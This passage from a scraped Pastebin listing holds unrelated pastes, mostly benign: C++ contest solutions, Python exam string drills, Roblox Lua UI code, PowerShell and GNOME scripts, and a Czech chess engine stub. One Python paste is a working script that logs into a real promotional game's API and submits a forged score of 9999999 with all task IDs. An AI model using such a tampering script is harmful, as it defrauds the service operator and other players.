                xTmp = 0;
            }
        }
        if (xTmp > 0) {
            return false;
        }
    }
    return true;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    cin >> T;
    while (T--) {
        cin >> n;
        LL low = 0;
        LL high = 0;
        LL mid;
        for (int i = 1; i <= n; ++i) {
            cin >> a[i];
        }
        init();
        LL mx = rmqMax(1, n);
        for (int i = 1; i <= n; ++i) {
            cin >> b[i];
            high += mx * b[i];
        }
        high /= n;
        ++high;
        while (high - low > 1) {
            mid = (high + low) >> 1;
            if (judge(mid)) {
                low = mid;
            } else {
                high = mid;
            }
        }
        cout << low << endl;
    }

    return 0;
}
"
4cFpyEjV,Первый веб 24,Nsinecode,Python,Tuesday 1st of April 2025 02:15:18 PM CDT,"f = open('test.txt').readline()

print(max([len(i) for i in f.replace('a', ' ').replace('s', ' ').replace('d',' ').split()]))
# asdf -> s f -> 1,1 -> 1

#1...9abcdef
f = open('24_9791.txt').readline()

s = 'QWRTYUIOPSGHJKLZXVNM'
for i in s:
    f = f.replace(i,' ')

print(max( [len(i) for i in f.split()] )) #21

# combination 'st' is forbidden
# st -> __ wrong
# st -> s_t ok

# combination 'kege' is forbidden
'''
--------------
asdfasdfasdKEGEaasdhsdasda
            --------------
KEGE -> keg_ege
'''
s = open('test.txt').readline()
s = s.replace('KEGE', 'KEG EGE')

# combinations may intersect 'ffffff'
# replace cannot deal with this
# sol: multiple replaces

while 'fff' in s:
    s = s.replace('fff', 'ff ff')
print(max(len(i) for i in s.split()))


# pairs of symbols ( without intersects )

f = open('24_223.txt').readline()

f = f.replace('TIK', '*').replace('TOK', '*')
# for i in 'IKOT':
#     f.replace(i,' ')
print(f.count('*'))

#letter + digit + digit without intersects
s = '14234234sdafsasdf123asdf132f'
s = s.replace('all digits', 'unified digit').replace('all letters', 'unified letter')
s = s.replace('A11', '*').replace('A', ' ').replace('1', ' ')
print(max(len(i) for i in s.split()))

f = open('24_9845.txt').readline()

f = f.replace('B','A').replace('C','A').replace('9','8')
while 'AA' in f or '88' in f:
    f = f.replace('AA', 'A A').replace('88', '8 8')

print(max(len(i) for i in f.split()))


f = open('24_17641.txt').readline()

while '++' in f or '+*' in f or '*+' in f or '**' in f:
    f = f.replace('++', ' ').replace('+*', ' ').replace('*+', ' ').replace('**', ' ')

while '+ ' in f or '* ' in f or ' +' in f or ' *' in f:
    f = f.replace(' +', ' ').replace('+ ', ' ').replace('* ', ' ').replace(' *', ' ')

print(max( [len(i) for i in f.split() if eval(i) == 0] ))


# symbol number limit
# split() != split(' ') because you can face multiple spaces, so 'SS__SS' -> 'SS', '', 'SS'

s = 'BBBACCCCAAGGGTTAD'
s = s.split('A')
m = -1
for i in range(3, len(s)):
    #c = s[i]+'A'+s[i-1]+'A'+s[i-2]+'A'+s[i-3]
    c = 'A'.join(s[i-3:i+1])
    m = max(m,len(c))
print(m)

# split by symbol min len
s = 'BBBACCCCAAGGGTTAD'
s = s.split('A')
m = 1000
for i in range(len(s)-3):
    #c = 'A'+s[i-1]+'A'+s[i-2]+'A'
    c = 'A'.join(s[i+1:i+3])
    m = min(m,len(c) + 2)
print(m)"
5v3e0hrx,lib,Achitsak,Lua,Tuesday 1st of April 2025 01:44:09 PM CDT,"local NotificationModule = {}

-- Cosmic Notification Configuration
local CONFIG = {
    DURATION = 5, -- Notification display time
    ANIMATION_DURATION = 0.4, -- Smooth animation speed
    PADDING = 20, -- Padding from screen edge
    MAX_NOTIFICATIONS = 3, -- Maximum simultaneous notifications
    STYLES = {
        DEFAULT = {
            Background = Color3.fromRGB(20, 20, 40),
            Accent = Color3.fromRGB(50, 50, 100),
            Text = Color3.fromRGB(200, 220, 255),
            Glow = Color3.fromRGB(100, 150, 255)
        },
        SUCCESS = {
            Background = Color3.fromRGB(0, 30, 20),
            Accent = Color3.fromRGB(0, 100, 70),
            Text = Color3.fromRGB(100, 255, 180),
            Glow = Color3.fromRGB(0, 255, 150)
        },
        WARNING = {
            Background = Color3.fromRGB(40, 30, 0),
            Accent = Color3.fromRGB(100, 80, 0),
            Text = Color3.fromRGB(255, 220, 100),
            Glow = Color3.fromRGB(255, 180, 50)
        },
        ERROR = {
            Background = Color3.fromRGB(40, 0, 0),
            Accent = Color3.fromRGB(100, 0, 0),
            Text = Color3.fromRGB(255, 120, 120),
            Glow = Color3.fromRGB(255, 50, 50)
        },
        INFO = {
            Background = Color3.fromRGB(0, 20, 40),
            Accent = Color3.fromRGB(0, 50, 100),
            Text = Color3.fromRGB(100, 200, 255),
            Glow = Color3.fromRGB(50, 150, 255)
        }
    }
}

-- Services
local Players = game:GetService(""Players"")
local TweenService = game:GetService(""TweenService"")

-- Notification Queue
local NotificationQueue = {
    Active = {},
    Pending = {}
}

-- Create Starry Background
local function createStarryBackground(parent, styleConfig)
    local stars = Instance.new(""Frame"")
    stars.Size = UDim2.new(1, 0, 1, 0)
    stars.BackgroundTransparency = 1
    stars.ClipsDescendants = true
    stars.Parent = parent

    -- Create multiple layers of stars
    for i = 1, 20 do
        local star = Instance.new(""Frame"")
        star.Size = UDim2.new(0, math.random(1, 2), 0, math.random(1, 2))
        star.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        star.BackgroundTransparency = math.random(6, 9) / 10
        star.Position = UDim2.new(math.random(), math.random(), math.random(), math.random())
        star.Parent = stars

        -- Twinkling effect
        local twinkleTween = TweenService:Create(star, 
            TweenInfo.new(
                math.random(1, 3), 
                Enum.EasingStyle.Sine, 
                Enum.EasingDirection.InOut, 
                -1, 
                true
            ), 
            {BackgroundTransparency = math.random(7, 9) / 10}
        )
        twinkleTween:Play()
    end

    return stars
end

-- Create Notification Frame
local function createNotificationFrame(container, style)
    local styleConfig = CONFIG.STYLES[style] or CONFIG.STYLES.DEFAULT
    
    local frame = Instance.new(""Frame"")
    frame.Size = UDim2.new(0, 300, 0, 90)
    frame.BackgroundColor3 = styleConfig.Background
    frame.BorderSizePixel = 0
    frame.Parent = container

    -- Starry Background
    local starryBg = createStarryBackground(frame, styleConfig)

    -- Rounded Corners
    local corner = Instance.new(""UICorner"")
    corner.CornerRadius = UDim.new(0, 15)
    corner.Parent = frame

    -- Soft Glow Border
    local glowBorder = Instance.new(""Frame"")
    glowBorder.Size = UDim2.new(1, 6, 1, 6)
    glowBorder.Position = UDim2.new(0, -3, 0, -3)
    glowBorder.BackgroundColor3 = styleConfig.Glow
    glowBorder.BackgroundTransparency = 0.7
    glowBorder.BorderSizePixel = 0
    glowBorder.ZIndex = 0
    
    local glowCorner = Instance.new(""UICorner"")
    glowCorner.CornerRadius = UDim.new(0, 18)
    glowCorner.Parent = glowBorder
    
    glowBorder.Parent = frame

    return frame
end

-- Create Notification Content
local function createNotificationContent(frame, title, description, style)
    local styleConfig = CONFIG.STYLES[style] or CONFIG.STYLES.DEFAULT
    
    -- Progress Container
    local progressContainer = Instance.new(""Frame"")
    progressContainer.Size = UDim2.new(1, -20, 0, 4)
    progressContainer.Position = UDim2.new(0, 10, 1, -10)
    progressContainer.BackgroundColor3 = styleConfig.Accent
    progressContainer.BackgroundTransparency = 0.7
    progressContainer.BorderSizePixel = 0
    progressContainer.Parent = frame

    local progressCorner = Instance.new(""UICorner"")
    progressCorner.CornerRadius = UDim.new(1, 0)
    progressCorner.Parent = progressContainer

    -- Progress Bar
    local progressBar = Instance.new(""Frame"")
    progressBar.Size = UDim2.new(1, 0, 1, 0)
    progressBar.BackgroundColor3 = styleConfig.Text
    progressBar.BorderSizePixel = 0
    progressBar.Parent = progressContainer

    local progressBarCorner = Instance.new(""UICorner"")
    progressBarCorner.CornerRadius = UDim.new(1, 0)
    progressBarCorner.Parent = progressBar

    -- Title Label
    local titleLabel = Instance.new(""TextLabel"")
    titleLabel.Text = title
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextColor3 = styleConfig.Text
    titleLabel.TextSize = 17
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Position = UDim2.new(0, 15, 0, 15)
    titleLabel.Size = UDim2.new(1, -30, 0, 25)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Parent = frame

    -- Description Label
    local descLabel = Instance.new(""TextLabel"")
    descLabel.Text = description
    descLabel.Font = Enum.Font.Gotham
    descLabel.TextColor3 = styleConfig.Text
    descLabel.TextTransparency = 0.3
    descLabel.TextSize = 14
    descLabel.TextXAlignment = Enum.TextXAlignment.Left
    descLabel.TextWrapped = true
    descLabel.Position = UDim2.new(0, 15, 0, 40)
    descLabel.Size = UDim2.new(1, -30, 0, 35)
    descLabel.BackgroundTransparency = 1
    descLabel.Parent = frame

    return titleLabel, descLabel, progressBar
end

-- Create Notification Container
local function createNotificationContainer(player)
    local container = Instance.new(""ScreenGui"")
    container.Name = ""CosmicNotificationGui""
    container.ResetOnSpawn = false
    container.DisplayOrder = 100
    container.Parent = player.PlayerGui

    -- Vertical Layout (Top to Bottom)
    local layout = Instance.new(""UIListLayout"")
    layout.SortOrder = Enum.SortOrder.TopToBottom
    layout.Padding = UDim.new(0, 15)
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Right
    layout.Parent = container

    return container
end

-- Animate Notification In
local function animateNotificationIn(frame)
    local startPos = UDim2.new(1, frame.Size.X.Offset, 0, -frame.Size.Y.Offset)
    local endPos = UDim2.new(1, -frame.Size.X.Offset - CONFIG.PADDING, 0, CONFIG.PADDING)
    
    frame.Position = startPos
    frame.BackgroundTransparency = 1
    
    local tweenInfoIn = TweenInfo.new(
        CONFIG.ANIMATION_DURATION, 
        Enum.EasingStyle.Back, 
        Enum.EasingDirection.Out
    )
    
    local tweenPos = TweenService:Create(frame, tweenInfoIn, {
        Position = endPos,
        BackgroundTransparency = 0
    })
    
    tweenPos:Play()
end

-- Animate Notification Out
local function animateNotificationOut(frame)
    local endPos = UDim2.new(1, frame.Size.X.Offset, 0, -frame.Size.Y.Offset)
    
    local tweenInfoOut = TweenInfo.new(
        CONFIG.ANIMATION_DURATION, 
        Enum.EasingStyle.Back, 
        Enum.EasingDirection.In
    )
    
    local tweenOut = TweenService:Create(frame, tweenInfoOut, {
        Position = endPos,
        BackgroundTransparency = 1
    })
    
    tweenOut:Play()
    
    tweenOut.Completed:Connect(function()
        -- Remove from active notifications
        for i, notification in ipairs(NotificationQueue.Active) do
            if notification.Frame == frame then
                table.remove(NotificationQueue.Active, i)
                break
            end
        end
        
        frame:Destroy()
        
        -- Try to show next pending notification
        NotificationModule:ProcessQueue()
    end)
end

-- Animate Progress Bar
local function animateProgressBar(progressBar, duration)
    local tweenInfo = TweenInfo.new(
        duration, 
        Enum.EasingStyle.Linear
    )
    
    local progressTween = TweenService:Create(progressBar, tweenInfo, {
        Size = UDim2.new(0, 0, 1, 0)
    })
    
    progressTween:Play()
end

-- Process Notification Queue
function NotificationModule:ProcessQueue()
    -- If we haven't reached max notifications and there are pending notifications
    if #self.NotificationQueue.Active < CONFIG.MAX_NOTIFICATIONS and 
       #self.NotificationQueue.Pending > 0 then
        -- Get the next pending notification
        local nextNotification = table.remove(self.NotificationQueue.Pending, 1)
        
        -- Show the notification
        self:Show(
            nextNotification.Title, 
            nextNotification.Description, 
            nextNotification.Style
        )
    end
end

-- Main Notification Function
function NotificationModule:Show(title, description, style)
    local player = Players.LocalPlayer
    if not player then return end
    
    -- Validate style
    style = style or ""DEFAULT""
    style = CONFIG.STYLES[style] and style or ""DEFAULT""
    
    -- If we've reached max notifications, queue this notification
    if #NotificationQueue.Active >= CONFIG.MAX_NOTIFICATIONS then
        table.insert(NotificationQueue.Pending, {
            Title = title,
            Description = description,
            Style = style
        })
        return
    end
    
    -- Create or find existing GUI container
    local container = player.PlayerGui:FindFirstChild(""CosmicNotificationGui"") 
        or createNotificationContainer(player)
    
    -- Create notification frame
    local frame = createNotificationFrame(container, style)
    local titleLabel, descLabel, progressBar = createNotificationContent(
        frame, title, description, style
    )
    
    -- Track this active notification
    local notification = {
        Frame = frame,
        Title = title,
        Description = description,
        Style = style
    }
    table.insert(NotificationQueue.Active, notification)
    
    -- Animate in
    animateNotificationIn(frame)
    
    -- Animate progress bar
    animateProgressBar(progressBar, CONFIG.DURATION)
    
    -- Auto-dismiss
    task.delay(CONFIG.DURATION, function()
        if frame and frame.Parent then
            animateNotificationOut(frame)
        end
    end)
    
    return frame
end

-- Initialize NotificationQueue in the module
NotificationModule.NotificationQueue = NotificationQueue

-- Expose notification styles
NotificationModule.Style = {
    DEFAULT = ""DEFAULT"",
    SUCCESS = ""SUCCESS"",
    WARNING = ""WARNING"",
    ERROR = ""ERROR"",
    INFO = ""INFO""
}

return NotificationModule"
GD9kMQhh,fe c00lgui fe bypass 2025 free robux delta executor,JustARandomBacon,Lua,Tuesday 1st of April 2025 01:13:03 PM CDT,"print(""i like men"")"
RCbPSYqv,"replace text (multiple files, multiple replacements)",joedigital,PowerShell,Tuesday 1st of April 2025 01:11:33 PM CDT,"<# sample command line
.\sanitizeLinkfixerScans.ps1 -SourcePath ""G:\Shared drives\"" -fileFilter ""Scan Detail*"" -OFilePrefix ""sanitized-""

#assign params from command line
#>
param(
  [Alias(""UNCPath"")]
  [Parameter(Mandatory)]
    [string]$SourcePath, #trailing backslash is required
  [Parameter(Mandatory)]
    [string]$fileFilter,
  [Alias(""OFilePrefix"")]
  [Parameter(Mandatory)]
    [string]$OutputFilePrefix
)

$sanitizeFiles = (Get-ChildItem -Path $SourcePath -Filter $fileFilter).Name #.Name does not include the SourcePath
$mycountdown = $sanitizeFiles.count

if ($mycountdown -eq 0) {
  Write-Host ""exiting, no files matching '$fileFilter' in '$SourcePath'"" -ForegroundColor Green -backgroundColor DarkGray
  exit
  }
else {
  $begTime = Get-Date
  #$begTime
  $myCounter=1
  foreach ($csvFile in $sanitizeFiles) {
    $fullFileName = $SourcePath + $csvFile
      $textToReplace = [System.IO.File]::ReadAllText(""$fullFileName"") #read the file once
  <#
  #The .Replace() method, when used directly on a string object, is case-sensitive.

  todo: delete the first 4 lines
    regex: starts with ""Computer Name:..."" ends with ""delete these first four rows.""
  #>
      $textToReplace = $textToReplace.Replace('LinkTek Support via phone (727-442-1822) or email (Support@LinkTek.com)', 'support')
      $textToReplace = $textToReplace.Replace('LinkTek Support via email at Support@LinkTek.com or call 727-442-1822', 'support')
      $textToReplace = $textToReplace.Replace('Support via email at Support@LinkTek.com or call 727-442-1822', 'support')
      $textToReplace = $textToReplace.Replace('Support@LinkTek.com or call 727-442-1822', 'support')
      $textToReplace = $textToReplace.Replace('Support@LinkTek.com or calling 727-442-1822', 'support')
      $textToReplace = $textToReplace.Replace('Support@LinkTek.com', 'support')
      $textToReplace = $textToReplace.Replace('LinkTek Support', 'support')
      $textToReplace = $textToReplace.Replace('LinkTek support', 'support')
      $textToReplace = $textToReplace.Replace('help at 727-442-1822', 'support')
      $textToReplace = $textToReplace.Replace('LinkFixer Advanced', 'analysis')
      $oFile = $SourcePath + $OutputFilePrefix + $csvFile
    [System.IO.File]::WriteAllText($oFile, $textToReplace)
    Write-Host $csvFile ""($myCounter of $myCountdown)""
    $myCounter++
  }
  $endTime = Get-Date
  #$endTime
  New-TimeSpan -Start $begTime -End $endTime | Select-Object -Property TotalSeconds

  Write-Host ""end of script: $myCounter of $myCountdown sanitized""  -ForegroundColor Green  -backgroundColor DarkGray
}"
RGKbrPGA,Untitled,asdfg0998,C++,Tuesday 1st of April 2025 01:07:39 PM CDT,"int longestSubsequenceEfficient(std::string x, std::string y) {
    int m = x.length();
    int n = y.length();
    int result = 0;
    
    // For each starting position in y
    for (int i = 0; i < n; i++) {
        // Early termination if remaining length can't beat current max
        if (n - i <= result) break;
        
        // Use a sliding window approach with two pointers
        std::vector<std::vector<int>> next(n + 1, std::vector<int>(26, -1));
        
        // Precompute next occurrence of each character
        for (int j = n - 1; j >= i; j--) {
            for (int c = 0; c < 26; c++) {
                next[j][c] = next[j + 1][c];
            }
            next[j][y[j] - 'a'] = j;
        }
        
        // Try to match each substring starting at position i
        for (int len = 1; i + len - 1 < n; len++) {
            bool isSubsequence = true;
            int pos = 0;
            
            // Check if y[i...i+len-1] is a subsequence of x
            for (int j = i; j < i + len; j++) {
                // Find the next occurrence of y[j] in x starting from pos
                while (pos < m && x[pos] != y[j]) {
                    pos++;
                }
                
                if (pos >= m) {
                    isSubsequence = false;
                    break;
                }
                pos++; // Move to the next position in x
            }
            
            if (isSubsequence) {
                result = std::max(result, len);
            } else {
                // If current length is not a subsequence, longer ones won't be either
                break;
            }
        }
    }
    
    return result;
}"
sQxQha5a,Main,artiri_art,JSON,Tuesday 1st of April 2025 01:00:50 PM CDT,"[
  { name: ""gem_buffs"", value: ""https://pastebin.com/raw/9BxFfGbe"" },
  { name: ""useful_commands"", value: ""https://pastebin.com/xqzFvB6E"" }
]"
s5MxGmk9,xxxxx,Dmaxiya,C++,Tuesday 1st of April 2025 12:53:39 PM CDT,"#include <bits/stdc++.h>
using namespace std;
const int MAX = 2e5 + 100;
const int maxn = 50;
int n, ans;
bool allOut;
string s, t;
int degin[maxn], degout[maxn];
int G[maxn][maxn];
int fa[maxn], cnt[maxn];
bool vis[maxn];

void init() {
    for (int i = 0; i < 26; ++i) {
        fa[i] = i;
        cnt[i] = 1;
    }
}

int findF(int x) {
    return x == fa[x] ? x : fa[x] = findF(fa[x]);
}

void union_(int x, int y) {
    x = findF(x);
    y = findF(y);
    if (x != y) {
        fa[x] = y;
        degout[y] += degout[x];
        cnt[y] += cnt[x];
    }
}

int id(char ch) {
    return ch - 'a';
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc

    ios::sync_with_stdio(false);
    cin.tie(nullptr);

    cin >> n >> s >> t;
    for (int i = 0; i < n; ++i) {
        G[id(s[i])][id(t[i])] = 1;
        vis[id(s[i])] = true;
        vis[id(t[i])] = true;
    }
    bool allVis = true;
    for (int i = 0; i < 26; ++i) {
        if (!vis[i]) {
            allVis = false;
        }
        for (int j = 0; j < 26; ++j) {
            if (G[i][j] == 1) {
                ++degout[i];
                if (degout[i] > 1) {
                    cout << -1 << endl;
                    return 0;
                }
            }
        }
    }
    for (int i = 0; i < 26; ++i) {
        if (G[i][i] == 1) {
            --degout[i];
        }
    }
    init();
    for (int i = 0; i < 26; ++i) {
        for (int j = 0; j < 26; ++j) {
            if (G[i][j] == 1) {
                union_(i, j);
            }
        }
    }
    int circle = 0;
    memset(vis, 0, sizeof(vis));
    for (int i = 0; i < 26; ++i) {
        int f = findF(i);
        if (!vis[f]) {
            vis[f] = true;
            if (cnt[f] == degout[f]) {
                ans += degout[f] + 1;
                ++circle;
            } else {
                ans += degout[f];
            }
        }
    }
    if (circle > 0 && allVis) {
        cout << -1 << endl;
        return 0;
    }
    cout << ans << endl;

    return 0;
}
"
ussVzfB8,Untitled,sosyamba,Python,Tuesday 1st of April 2025 12:51:14 PM CDT,"import requests
import json

# --- Credentials and Configuration (Fill these in) ---
# Found in the /auth/login request body
AUTH_USER_ID = ""YOUR_USER_ID_HERE"" # e.g., ""9391359423245""
AUTH_PHONE_NUMBER = ""YOUR_PHONE_NUMBER_HERE"" # e.g., ""9807423145""
AUTH_EPOCH = ""YOUR_EPOCH_TIMESTAMP_HERE"" # e.g., ""1743435147""
AUTH_HASH = ""YOUR_HASH_HERE"" # e.g., ""ae25f...""

# Found in the headers of requests after login
# Replace with the actual Bearer token needed for authorized requests
BEARER_TOKEN = ""YOUR_BEARER_TOKEN_HERE"" # e.g., ""eyJhbGciOiJIUz...""

# Found in the headers of the login request (and subsequent requests)
LOGIN_COOKIE_HEADER = ""YOUR_FULL_COOKIE_HEADER_STRING_HERE"" # e.g., ""qrator_jsr=...; qrator_jsid=...; _ym_uid=...; ...""

# Found in the body of the /game/finish request
# Adjust this value as needed for the game logic
RESULTS_COUNT_VALUE = 9999999
# --- End of Credentials and Configuration ---


# --- 1. Login Request ---
url_login = ""https://game.winelab.ru/api/v1/auth/login""
headers_login = {
    ""Accept"": ""application/json, text/plain, */*"",
    ""Accept-Language"": ""ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7"",
    ""Content-Type"": ""application/json"",
    ""Cookie"": LOGIN_COOKIE_HEADER, # Use the configured cookie
    ""Origin"": ""https://game.winelab.ru"",
    ""Referer"": ""https://game.winelab.ru/game/"",
    ""sec-ch-ua"": '""Chromium"";v=""134"", ""Not:A-Brand"";v=""24"", ""Android WebView"";v=""134""',
    ""sec-ch-ua-mobile"": ""?1"",
    ""sec-ch-ua-platform"": '""Android""',
    ""Sec-Fetch-Dest"": ""empty"",
    ""Sec-Fetch-Mode"": ""cors"",
    ""Sec-Fetch-Site"": ""same-origin"",
    ""User-Agent"": ""Mozilla/5.0 (Linux; Android 13; Infinix X6833B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.135 Mobile Safari/537.36"",
    ""X-Requested-With"": ""ru.winelab""
}
payload_login = {
  ""type"": ""auth"",
  ""user_id"": AUTH_USER_ID,
  ""phone_number"": AUTH_PHONE_NUMBER,
  ""epoch"": AUTH_EPOCH,
  ""hash"": AUTH_HASH
}

session_id = None
try:
    response_login = requests.post(url_login, headers=headers_login, json=payload_login)
    response_login.raise_for_status()
    login_data = response_login.json()
    session_id = login_data['session_id']
except requests.exceptions.RequestException as e:
    print(f""Login request failed: {e}"")
    exit()
except (KeyError, json.JSONDecodeError) as e:
    print(f""Failed to parse login response or get session_id: {e}"")
    if 'response_login' in locals():
        print(f""Login Response Text: {response_login.text}"")
    exit()

# --- Common Headers for subsequent requests ---
headers_common = {
    ""Accept"": ""application/json, text/plain, */*"",
    ""Accept-Language"": ""ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7"",
    ""authorization"": f""Bearer {BEARER_TOKEN}"",
    ""Cookie"": LOGIN_COOKIE_HEADER,
    ""Referer"": ""https://game.winelab.ru/game/"",
    ""Origin"": ""https://game.winelab.ru"",
    ""sec-ch-ua"": '""Chromium"";v=""134"", ""Not:A-Brand"";v=""24"", ""Android WebView"";v=""134""',
    ""sec-ch-ua-mobile"": ""?1"",
    ""sec-ch-ua-platform"": '""Android""',
    ""Sec-Fetch-Dest"": ""empty"",
    ""Sec-Fetch-Mode"": ""cors"",
    ""Sec-Fetch-Site"": ""same-origin"",
    ""User-Agent"": headers_login[""User-Agent""],
    ""X-Requested-With"": ""ru.winelab""
}

# --- 2. Get All Tasks Request ---
url_alltasks = ""https://game.winelab.ru/api/v1/alltasks""
task_ids_list = []
try:
    response_alltasks = requests.get(url_alltasks, headers=headers_common)
    response_alltasks.raise_for_status()
    all_tasks_data = response_alltasks.json()
    task_ids_list = [task['id'] for task in all_tasks_data if 'id' in task]
except requests.exceptions.RequestException as e:
    print(f""Get All Tasks request failed: {e}"")
    exit()
except (json.JSONDecodeError, TypeError, KeyError) as e:
    print(f""Failed to parse tasks response or extract IDs: {e}"")
    if 'response_alltasks' in locals():
        print(f""Tasks Response Text: {response_alltasks.text}"")
    exit()

if not task_ids_list:
    print(""No task IDs found in the response. Exiting."")
    exit()

# --- 3. Start Game Request ---
url_start_game = f""https://game.winelab.ru/api/v1/game/start/{session_id}""
headers_start_game = headers_common.copy()
game_id = None
try:
    response_start_game = requests.post(url_start_game, headers=headers_start_game)
    response_start_game.raise_for_status()
    start_game_data = response_start_game.json()
    game_id = start_game_data['game_id']
except requests.exceptions.RequestException as e:
    print(f""Start Game request failed: {e}"")
    exit()
except (KeyError, json.JSONDecodeError) as e:
    print(f""Failed to parse start game response or get game_id: {e}"")
    if 'response_start_game' in locals():
      print(f""Start Game Response Text: {response_start_game.text}"")
    exit()

# --- 4. Finish Game Request ---
url_finish_game = ""https://game.winelab.ru/api/v1/game/finish""
headers_finish_game = headers_common.copy()
headers_finish_game[""Content-Type""] = ""application/json""

payload_finish_game = {
  ""game_id"": str(game_id),
  ""session_id"": session_id,
  ""results_count"": RESULTS_COUNT_VALUE,
  ""task_ids"": task_ids_list
}

response_finish_game = None # Initialize variable
try:
    response_finish_game = requests.put(url_finish_game, headers=headers_finish_game, json=payload_finish_game)
    response_finish_game.raise_for_status()
    print(f""Finish Game Status Code: {response_finish_game.status_code}"")
    print(""Finish Game Response JSON:"")
    print(response_finish_game.json())
except requests.exceptions.RequestException as e:
    print(f""Finish Game request failed: {e}"")
    if response_finish_game is not None:
        print(f""Finish Game Response Text: {response_finish_game.text}"")
except json.JSONDecodeError:
    print(f""Finish Game Status Code: {response_finish_game.status_code}"")
    print(""Finish Game Response Text (not JSON):"")
    if response_finish_game is not None:
        print(response_finish_game.text)"
hLfyPs9k,Untitled,asdfg0998,C++,Tuesday 1st of April 2025 12:35:20 PM CDT,"int longestSubsequence(string x, string y) {
    int n = x.size(), m = y.size();
    vector<vector<int>> dp(n + 1, vector<int>(m + 1, 0));

    // Compute the longest common subsequence that is also a substring
    int maxLength = 0;
    for (int i = 1; i <= n; i++) {
        for (int j = 1; j <= m; j++) {
            if (x[i - 1] == y[j - 1]) {
                dp[i][j] = dp[i - 1][j - 1] + 1;
                maxLength = max(maxLength, dp[i][j]);
            }
        }
    }

    return maxLength;
}"
VsXPnLeZ,Gnome Settings,Wrigs,Bash,Tuesday 1st of April 2025 12:22:47 PM CDT,"# ==============================================================================
# Add Minimize and Maximize Buttons in GNOME
# ==============================================================================

gsettings set org.gnome.desktop.wm.preferences button-layout "":minimize,maximize,close""


# ==============================================================================
# Keyboard Shortcuts
# ==============================================================================
 
# Navigation - MOVE WINDOW COMMANDS
gsettings set org.gnome.desktop.wm.keybindings move-to-workspace-1 ""['<Control><Alt>KP_1']"" &&
gsettings set org.gnome.desktop.wm.keybindings move-to-workspace-2 ""['<Control><Alt>KP_2']"" &&
gsettings set org.gnome.desktop.wm.keybindings move-to-workspace-3 ""['<Control><Alt>KP_3']"" &&
gsettings set org.gnome.desktop.wm.keybindings move-to-workspace-4 ""['<Control><Alt>KP_4']"" &&
gsettings set org.gnome.desktop.wm.keybindings move-to-workspace-5 ""['<Control><Alt>KP_5']"" &&
gsettings set org.gnome.desktop.wm.keybindings move-to-workspace-6 ""['<Control><Alt>KP_6']"" &&
gsettings set org.gnome.desktop.wm.keybindings move-to-workspace-7 ""['<Control><Alt>KP_7']"" &&
gsettings set org.gnome.desktop.wm.keybindings move-to-workspace-8 ""['<Control><Alt>KP_8']"" &&
gsettings set org.gnome.desktop.wm.keybindings move-to-workspace-9 ""['<Control><Alt>KP_9']""
 
 
gsettings set org.gnome.desktop.wm.keybindings move-to-workspace-left ""['<Control><Alt>Left']"" &&
gsettings set org.gnome.desktop.wm.keybindings move-to-workspace-right ""['<Control><Alt>Right']""
 
 
# Navigation - SWITCH WINDOW COMMANDS
gsettings set org.gnome.desktop.wm.keybindings switch-to-workspace-1 ""['<Control><Super>KP_1']"" &&
gsettings set org.gnome.desktop.wm.keybindings switch-to-workspace-2 ""['<Control><Super>KP_2']"" &&
gsettings set org.gnome.desktop.wm.keybindings switch-to-workspace-3 ""['<Control><Super>KP_3']"" &&
gsettings set org.gnome.desktop.wm.keybindings switch-to-workspace-4 ""['<Control><Super>KP_4']"" &&
gsettings set org.gnome.desktop.wm.keybindings switch-to-workspace-5 ""['<Control><Super>KP_5']"" &&
gsettings set org.gnome.desktop.wm.keybindings switch-to-workspace-6 ""['<Control><Super>KP_6']"" &&
gsettings set org.gnome.desktop.wm.keybindings switch-to-workspace-7 ""['<Control><Super>KP_7']"" &&
gsettings set org.gnome.desktop.wm.keybindings switch-to-workspace-8 ""['<Control><Super>KP_8']"" &&
gsettings set org.gnome.desktop.wm.keybindings switch-to-workspace-9 ""['<Control><Super>KP_9']""
 
gsettings set org.gnome.desktop.wm.keybindings switch-to-workspace-left ""['<Control><Super>Left']"" &&
gsettings set org.gnome.desktop.wm.keybindings switch-to-workspace-right ""['<Control><Super>Right']""
"
FkpZ2LjD,Add 1+ Extra Life (Script) (Story Game),Sungmingamerpro13,CSS,Tuesday 1st of April 2025 12:04:53 PM CDT,"local Number = 0
local MaxNumber = 1

script.Parent.Touched:Connect(function(Hit)
	if Hit.Parent:FindFirstChild(""Humanoid"") then
		local Character = Hit.Parent
		local player = game.Players:GetPlayerFromCharacter(Character)

		if not player:WaitForChild(""Lives"").Value and player.Lives.Value > Number then
			print(player.Name..""'s Lives: ""..player.Lives.Value)
			
			player.Lives.Value += 1
		elseif player:WaitForChild(""Lives"").Value and player.Lives.Value == MaxNumber then
			print(""You Now Have An Extra Life!"")
		end
	end
end)
"
UFxmVimk,NL well done kaK,max2201111,Python,Tuesday 1st of April 2025 11:41:43 AM CDT,"#!/usr/bin/env python3
import time
import threading
import sys
from math import inf

# Konstanty pro pohyby jezdce
knight_moves = [(2,1),(2,-1),(-2,1),(-2,-1),(1,2),(1,-2),(-1,2),(-1,-2)]

# Globální proměnné pro čas a historii tahů
running = False
start_time = 0
move_stack = []

def time_reporter():
    """"""Funkce pro výpis času každou sekundu na stejném řádku.""""""
    global running, start_time
    while running:
        elapsed = time.time() - start_time
        hrs = int(elapsed // 3600)
        mins = int((elapsed % 3600) // 60)
        secs = int(elapsed % 60)
        sys.stdout.write(f""\r[INFO] Uplynulý čas: {hrs:02d}h {mins:02d}m {secs:02d}s"")
        sys.stdout.flush()
        time.sleep(1)

class Board:
    def __init__(self, fen=None):
        """"""Inicializace šachovnice.""""""
        self.grid = [[' ' for _ in range(8)] for _ in range(8)]
        self.to_move = 'w'
        self.castling_rights = set()
        self.en_passant = None
        self.halfmove_clock = 0
        self.fullmove_number = 1
        if fen:
            self.set_fen(fen)
    
    def set_fen(self, fen):
        """"""Nastaví šachovnici podle FEN řetězce.""""""
        parts = fen.split()
        while len(parts) < 6:
            parts.append('0')
